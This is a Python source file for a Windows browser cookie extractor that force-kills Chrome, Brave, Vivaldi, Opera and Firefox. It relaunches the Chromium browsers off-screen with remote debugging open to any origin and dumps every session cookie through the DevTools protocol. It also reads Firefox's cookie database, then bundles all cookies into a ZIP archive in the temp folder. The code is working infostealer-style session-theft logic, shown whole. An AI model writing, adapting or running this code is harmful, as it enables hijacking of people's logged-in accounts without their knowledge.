import os
import subprocess
import requests
import websocket
import json
import sqlite3
import shutil
import zipfile
import tempfile
import time

class BrowserCookieExtractor:
    """Handles cookie extraction for multiple browsers."""

    def __init__(self):
        self.local_appdata = os.getenv("LOCALAPPDATA")
        self.appdata = os.getenv("APPDATA")
        self.program_files = os.getenv("PROGRAMFILES")
        self.program_files_x86 = os.getenv("PROGRAMFILES(X86)")
        self.storage_path = tempfile.gettempdir()

        # Browser configurations
        self.browsers = {
            "brave": {
                "exec_paths": [
                    os.path.join(self.program_files, "BraveSoftware\\Brave-Browser\\Application\\brave.exe"),
                    os.path.join(self.program_files_x86, "BraveSoftware\\Brave-Browser\\Application\\brave.exe"),
                    shutil.which("brave"),
                ],
                "user_data": os.path.join(self.local_appdata, "BraveSoftware\\Brave-Browser\\User Data"),
            },
            "google-chrome": {
                "exec_paths": [
                    os.path.join(self.program_files, "Google\\Chrome\\Application\\chrome.exe"),
                    os.path.join(self.program_files_x86, "Google\\Chrome\\Application\\chrome.exe"),
                ],
                "user_data": os.path.join(self.local_appdata, "Google\\Chrome\\User Data"),
            },
            "vivaldi": {
                "exec_paths": [
                    os.path.join(self.program_files, "Vivaldi\\Application\\vivaldi.exe"),
                    os.path.join(self.program_files_x86, "Vivaldi\\Application\\vivaldi.exe"),
                ],
                "user_data": os.path.join(self.local_appdata, "Vivaldi\\User Data"),
            },
            "opera": {
                "exec_paths": [
                    os.path.join(self.program_files, "Opera\\launcher.exe"),
                    os.path.join(self.program_files_x86, "Opera\\launcher.exe"),
                ],
                "user_data": os.path.join(self.local_appdata, "Opera Software\\Opera Stable"),
            },
            "opera-gx": {
                "exec_paths": [
                    os.path.join(self.program_files, "Opera GX\\launcher.exe"),
                    os.path.join(self.program_files_x86, "Opera GX\\launcher.exe"),
                ],
                "user_data": os.path.join(self.local_appdata, "Opera Software\\Opera GX Stable"),
            },
            "firefox": {
                "user_data": os.path.join(self.appdata, "Mozilla\\Firefox\\Profiles"),
            },
        }

        self.profiles = ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5"]
        self.cookies = []

    def taskkill(self, process_name):
        """Kill a process by name."""
        try:
            subprocess.call(["taskkill", "/F", "/IM", process_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception as e:
            print(f"Error killing process {process_name}: {e}")

    def find_executable(self, paths):
        """Find the first existing path from a list."""
        for path in paths:
            if path and os.path.exists(path):
                return path
        return None

    def extract_browser_cookies(self):
        """Extract cookies for all supported browsers."""
        all_cookies = {}
        for browser_name, config in self.browsers.items():
            if browser_name == "firefox":
                all_cookies[browser_name] = self.extract_firefox_cookies()
            else:
                exec_path = self.find_executable(config.get("exec_paths", []))
                user_data_path = config.get("user_data")
                if exec_path and os.path.exists(user_data_path):
                    all_cookies[browser_name] = self.extract_cookies(browser_name, exec_path, user_data_path)
        return all_cookies

    def extract_firefox_cookies(self):
        """Extract cookies from Firefox profiles."""
        firefox_path = self.browsers["firefox"]["user_data"]
        if not os.path.exists(firefox_path):
            return {}

        self.taskkill("firefox.exe")
        cookie_files = {}

        for profile in os.listdir(firefox_path):
            try:
                if profile.endswith(".default") or profile.endswith(".default-release"):
                    profile_path = os.path.join(firefox_path, profile)
                    cookies_path = os.path.join(profile_path, "cookies.sqlite")
                    if os.path.exists(cookies_path):
                        temp_file = self._extract_sqlite_cookies(cookies_path, "Firefox", profile)
                        cookie_files[profile] = temp_file
            except Exception as e:
                print(f"Error processing Firefox profile {profile}: {e}")

        return cookie_files

    def _extract_sqlite_cookies(self, sqlite_path, browser_name, profile_name):
        """Extract cookies from SQLite database and save in Netscape format."""
        temp_file = os.path.join(self.storage_path, f"Cookies-{browser_name}-{profile_name}.txt")
        copy_path = sqlite_path + ".copy"
        shutil.copy(sqlite_path, copy_path)

        connection = sqlite3.connect(copy_path)
        cursor = connection.cursor()
        cursor.execute("SELECT host, name, value FROM moz_cookies")
        with open(temp_file, "w") as f:
            for host, name, value in cursor.fetchall():
                f.write(f"{host}\tTRUE\t/\tFALSE\t0\t{name}\t{value}\n")
        cursor.close()
        connection.close()
        os.remove(copy_path)
        return temp_file

    def extract_cookies(self, browser_name, browser_path, user_data_path):
        """Extract cookies for Chromium-based browsers using remote debugging."""
        cookie_files = {}
        for profile in self.profiles:
            profile_path = os.path.join(user_data_path, profile)
            if os.path.exists(profile_path):
                self.taskkill(browser_name + ".exe")
                try:
                    # Launch browser with remote debugging
                    strtcmd = (
                        f'"{browser_path}" --window-position=-2400,-2400 '
                        f'--remote-debugging-port=9222 --remote-allow-origins=* '
                        f'--profile-directory="{profile}"'
                    )
                    subprocess.Popen(strtcmd, creationflags=subprocess.CREATE_NEW_CONSOLE, close_fds=True)

                    # Wait for debugging session to initialize
                    time.sleep(5)

                    # Connect to the remote debugging endpoint
                    targets = requests.get("http://localhost:9222/json").json()
                    if not targets:
                        print(f"No debugging targets found for {browser_name} ({profile}).")
                        continue

                    ws_url = targets[0]["webSocketDebuggerUrl"]
                    ws = websocket.create_connection(ws_url)

                    # Request cookies
                    payload = {"id": 1, "method": "Storage.getCookies", "params": {}}
                    ws.send(json.dumps(payload))

                    # Save cookies in Netscape format
                    cookie_str = ""
                    for cookie in json.loads(ws.recv())["result"]["cookies"]:
                        cookie_str += (
                            f"{cookie['domain']}\tTRUE\t/\tFALSE\t13355861278849698\t"
                            f"{cookie['name']}\t{cookie['value']}\n"
                        )

                    temp_file_path = os.path.join(self.storage_path, f"Cookies-{browser_name}-{profile}.txt")
                    with open(temp_file_path, "w") as f:
                        f.write(cookie_str)

                    print(f"Cookies saved for {browser_name} ({profile}) at {temp_file_path}")
                    cookie_files[profile] = temp_file_path
                    ws.close()
                except Exception as e:
                    print(f"Failed to retrieve cookies for {browser_name} ({profile}): {e}")
                finally:
                    self.taskkill(browser_name + ".exe")
        return cookie_files

    def create_zip(self, all_cookies):
        """Create a ZIP file containing all cookie files."""
        zip_file_path = os.path.join(self.storage_path, "Collected_Cookies.zip")
        with zipfile.ZipFile(zip_file_path, "w") as zipf:
            for browser, profiles in all_cookies.items():
                for profile, file_path in profiles.items():
                    if os.path.exists(file_path):
                        arcname = os.path.join(browser, os.path.basename(file_path))
                        zipf.write(file_path, arcname)
        return zip_file_path
